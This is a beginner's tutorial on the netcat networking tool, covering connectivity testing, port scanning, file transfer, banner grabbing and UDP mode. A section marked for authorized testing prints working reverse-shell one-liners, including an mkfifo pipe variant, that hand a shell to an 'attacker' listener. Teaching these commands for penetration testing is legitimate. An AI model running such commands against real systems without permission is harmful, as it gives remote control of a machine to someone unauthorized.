# A Beginner's Guide to Netcat

[![License: CC BY-NC-SA 4.0](https://img.shields.io/badge/License-CC%20BY--NC--SA%204.0-lightgrey.svg)](https://creativecommons.org/licenses/by-nc-sa/4.0/)


Netcat (nc) is often called the "Swiss Army knife" of networking. It's a simple but powerful command-line utility that reads and writes data across network connections using TCP or UDP. Whether you're debugging network issues, transferring files, or learning about networking fundamentals, netcat is an indispensable tool.


## Table of Contents

- [What is Netcat?](#what-is-netcat)
- [Installation](#installation)
- [Basic Syntax](#basic-syntax)
- [Common Flags](#common-flags)
- [Core Use Cases](#core-use-cases)
  - [Testing Connectivity](#testing-connectivity)
  - [Port Scanning](#port-scanning)
  - [Chat Between Two Machines](#chat-between-two-machines)
  - [Transferring Files](#transferring-files)
  - [Setting Up a Simple Server](#setting-up-a-simple-server)
  - [Banners and Service Fingerprinting](#banners-and-service-fingerprinting)
  - [Reverse Shells (for Authorized Testing)](#reverse-shells-for-authorized-testing)
- [UDP Mode](#udp-mode)
- [Netcat Variants](#netcat-variants)
- [Tips and Tricks](#tips-and-tricks)
- [Security Considerations](#security-considerations)
- [Quick Reference Cheat Sheet](#quick-reference-cheat-sheet)

---
## What is Netcat?

Netcat was originally written by Hobbit in 1995. At its core, it does one thing: it opens a TCP or UDP connection and lets you send and receive raw data through it. That simplicity is exactly what makes it so versatile.

Think of it like a pipe between two computers. On one end you listen, on the other you connect — and anything typed or piped into one end comes out the other.

---


[↑ Goto TOC](#table-of-contents)

## Installation

**Linux (Debian/Ubuntu)**
```bash
sudo apt update && sudo apt install netcat-openbsd
```

**Linux (RHEL/Fedora/CentOS)**
```bash
sudo dnf install nmap-ncat
```

**macOS (via Homebrew)**
```bash
brew install netcat
```

**Windows**

Netcat isn't built into Windows, but you have a few options:
- Download a Windows port of `nc.exe` from a trusted source
- Use [Ncat](https://nmap.org/ncat/), which ships with Nmap for Windows
- Use WSL (Windows Subsystem for Linux) and install it there

**Verify Installation**
```bash
nc -h        # or
nc --version
```

> **Note:** There are multiple variants of netcat (see [Netcat Variants](#netcat-variants)). The examples in this guide use `netcat-openbsd` syntax, the most commonly available version on modern Linux systems.

---


[↑ Goto TOC](#table-of-contents)

## Basic Syntax

```
nc [options] [hostname] [port]
```

When **connecting** to something:
```bash
nc 192.168.1.10 80
```

When **listening** for a connection:
```bash
nc -l -p 4444
# or on some systems:
nc -l 4444
```

---


[↑ Goto TOC](#table-of-contents)

## Common Flags

| Flag | Description |
|------|-------------|
| `-l` | Listen mode — wait for an incoming connection |
| `-p [port]` | Specify the local port to use |
| `-u` | Use UDP instead of TCP |
| `-v` | Verbose output (use `-vv` for more detail) |
| `-n` | Numeric only — skip DNS resolution |
| `-z` | Zero-I/O mode — scan without sending data |
| `-w [secs]` | Timeout for connections |
| `-e [cmd]` | Execute a command on connection (not available in all versions) |
| `-k` | Keep listening after a client disconnects (OpenBSD version) |
| `-q [secs]` | Quit after EOF on stdin after a delay (traditional nc) |

---


[↑ Goto TOC](#table-of-contents)

## Core Use Cases


[↑ Goto TOC](#table-of-contents)

### Testing Connectivity

One of the most common uses of netcat is simply verifying that a port is open and reachable — far more informative than ping alone.

```bash
nc -zv google.com 443
```

If the connection succeeds, you'll see something like:
```
Connection to google.com 443 port [tcp/https] succeeded!
```

If it fails:
```
nc: connectx to google.com port 444 (tcp) failed: Connection refused
```

This is especially useful for diagnosing firewall rules — if you can't connect to a port that should be open, a firewall is likely blocking you.

**Test multiple ports:**
```bash
nc -zv 192.168.1.1 20 21 22 80 443
```

---


[↑ Goto TOC](#table-of-contents)

### Port Scanning

Netcat can scan a range of ports using `-z` (zero I/O) mode. This won't replace a full port scanner like nmap, but it's handy when nmap isn't available.

```bash
nc -zv 192.168.1.1 1-1000
```

Add `-n` to skip DNS lookups and speed things up:
```bash
nc -znv 192.168.1.1 1-1000
```

Add a timeout so it doesn't hang on filtered ports:
```bash
nc -znvw1 192.168.1.1 1-1000
```

---


[↑ Goto TOC](#table-of-contents)

### Chat Between Two Machines

Netcat can function as a primitive real-time chat tool between two machines on the same network.

**On Machine A (listener):**
```bash
nc -l -p 5000
```

**On Machine B (connector):**
```bash
nc 192.168.1.10 5000
```

Now anything you type on either machine appears on the other. Press `Ctrl+D` to close the connection.

---


[↑ Goto TOC](#table-of-contents)

### Transferring Files

Netcat makes it easy to transfer files between machines without needing SCP, FTP, or any other protocol. It's unencrypted, so keep that in mind for sensitive data.

**On the receiving machine (sets up listener first):**
```bash
nc -l -p 5000 > received_file.txt
```

**On the sending machine:**
```bash
nc 192.168.1.10 5000 < file_to_send.txt
```

The file streams over the connection and is written to `received_file.txt`. When the transfer completes, netcat exits.

**Transfer an entire directory using tar:**

Receiver:
```bash
nc -l -p 5000 | tar xvf -
```

Sender:
```bash
tar cvf - /path/to/directory | nc 192.168.1.10 5000
```

**Track transfer progress with pv:**
```bash
cat bigfile.iso | pv | nc 192.168.1.10 5000
```

---


[↑ Goto TOC](#table-of-contents)

### Setting Up a Simple Server

You can use netcat to serve a file over HTTP — useful for quickly sharing something over a local network.

```bash
{ echo -e "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\n"; cat myfile.txt; } | nc -l -p 8080
```

Then visit `http://<your-ip>:8080` in a browser to receive the file. Note this only serves a single request before exiting.

You can also simulate a simple HTTP server response to inspect how a client behaves:
```bash
nc -l -p 8080
```
Then make a request to it and watch the raw HTTP headers come in.

---


[↑ Goto TOC](#table-of-contents)

### Banners and Service Fingerprinting

Many services announce themselves when you connect. Netcat lets you grab these banners manually.

**HTTP:**
```bash
nc -v example.com 80
```
Then type:
```
GET / HTTP/1.0
Host: example.com

```
(Press Enter twice at the end)

**SMTP:**
```bash
nc -v mail.example.com 25
```

**SSH:**
```bash
nc -v 192.168.1.1 22
```
SSH servers immediately send their version string — you'll see it without needing to authenticate.

**FTP:**
```bash
nc -v ftp.example.com 21
```

This manual approach helps you understand the raw protocols and is useful when debugging service issues.

---


[↑ Goto TOC](#table-of-contents)

### Reverse Shells (for Authorized Testing)

> ⚠️ **Only use this on systems you own or have explicit written permission to test. Unauthorized use is illegal.**

A reverse shell is when a target machine connects back to your machine and gives you a shell. This is widely used in penetration testing.

**Attacker machine (listener):**
```bash
nc -l -p 4444 -vv
```

**Target machine (connects back, traditional nc with -e):**
```bash
nc 192.168.1.100 4444 -e /bin/bash
```

If `-e` isn't available (OpenBSD netcat), use a named pipe instead:

```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.1.100 4444 > /tmp/f
```

Once connected, the attacker has an interactive shell on the target machine.

---


[↑ Goto TOC](#table-of-contents)

## UDP Mode

Add the `-u` flag to any netcat command to switch from TCP to UDP. UDP is connectionless, so the behavior is slightly different — there's no handshake, so "connection refused" messages aren't reported.

**Listen on UDP:**
```bash
nc -u -l -p 5000
```

**Send to UDP:**
```bash
nc -u 192.168.1.10 5000
```

**Test a UDP port:**
```bash
nc -zuv 192.168.1.1 53
```

UDP is useful for testing DNS (port 53), SNMP (port 161), Syslog (port 514), and other UDP-based services.

---


[↑ Goto TOC](#table-of-contents)

## Netcat Variants

You'll encounter a few different versions of netcat in the wild. The commands are mostly compatible but there are some differences to be aware of.

**Traditional/Original netcat (nc110)**
The oldest version. Supports `-e` for executing commands. Found on older systems.

**netcat-openbsd**
The most common on modern Linux and macOS. Does not include `-e` for security reasons. Supports `-k` to keep listening. This is what most of this guide uses.

**Ncat (from Nmap)**
The most modern and feature-rich variant. Supports SSL (`--ssl`), proxies, and IPv6. Recommended when you need advanced features.
```bash
ncat --ssl example.com 443
```

**GNU netcat**
Similar to the original. Available on some Linux distros.

To check which version you have:
```bash
nc -h 2>&1 | head -5
```

---


[↑ Goto TOC](#table-of-contents)

## Tips and Tricks

**Keep a listener alive across multiple connections (OpenBSD nc):**
```bash
nc -k -l -p 4444
```

**Send a UDP syslog message:**
```bash
echo "<34>Oct 11 22:14:15 mymachine su: test message" | nc -u 192.168.1.5 514
```

**Check if a web server is alive without a browser:**
```bash
echo -e "HEAD / HTTP/1.0\r\n\r\n" | nc -w5 example.com 80
```

**Quickly test SMTP by hand:**
```bash
nc mail.example.com 25
HELO mydomain.com
MAIL FROM:<test@example.com>
RCPT TO:<recipient@example.com>
DATA
Subject: Test

Hello!
.
QUIT
```

**Use with timeout to avoid hanging:**
```bash
nc -w3 192.168.1.1 80
```
Netcat will exit after 3 seconds of inactivity.

**Pipe command output over the network:**
```bash
# Sender
ls -la | nc 192.168.1.10 5000

# Receiver
nc -l -p 5000
```

---


[↑ Goto TOC](#table-of-contents)

## Security Considerations

Netcat is a powerful tool that can be misused. Keep these things in mind:

**It's unencrypted.** Any data sent over a netcat connection is plaintext. For sensitive data, use SSH or Ncat with `--ssl` instead.

**Listeners are exposed.** A netcat listener on an open port accepts connections from anyone who can reach it. On a public-facing server, bind to localhost:
```bash
nc -l -p 4444 127.0.0.1
```

**Use it only where you have permission.** Port scanning or connecting to services on systems you don't own is potentially illegal depending on your jurisdiction.

**It can be detected.** Network monitoring tools and IDS systems (like Snort or Suricata) can detect netcat traffic patterns.

**Disable it on production servers.** If you don't need netcat installed in a production environment, remove it. Its presence can be exploited by an attacker who gains access.

---


[↑ Goto TOC](#table-of-contents)

## Quick Reference Cheat Sheet

```bash
# Test if port is open
nc -zv host port

# Scan port range
nc -znvw1 host 1-1000

# Listen on a port
nc -l -p 4444

# Connect to a host
nc host 4444

# Send a file
nc host 5000 < file.txt

# Receive a file
nc -l -p 5000 > file.txt

# Transfer directory
tar cvf - /dir | nc host 5000       # sender
nc -l -p 5000 | tar xvf -           # receiver

# Grab HTTP banner
echo -e "GET / HTTP/1.0\r\n\r\n" | nc host 80

# Keep listener alive
nc -k -l -p 4444

# UDP mode
nc -u host port

# With timeout
nc -w5 host port

# Verbose connection
nc -vv host port
```

---

*Netcat is a foundational tool for anyone learning networking, system administration, or security. The best way to get comfortable with it is to experiment in a safe lab environment — spin up two VMs or two terminals on the same machine and start connecting them.*

[↑ Goto TOC](#table-of-contents)

---

© 2026 Jaco Steyn — Licensed under [CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/)
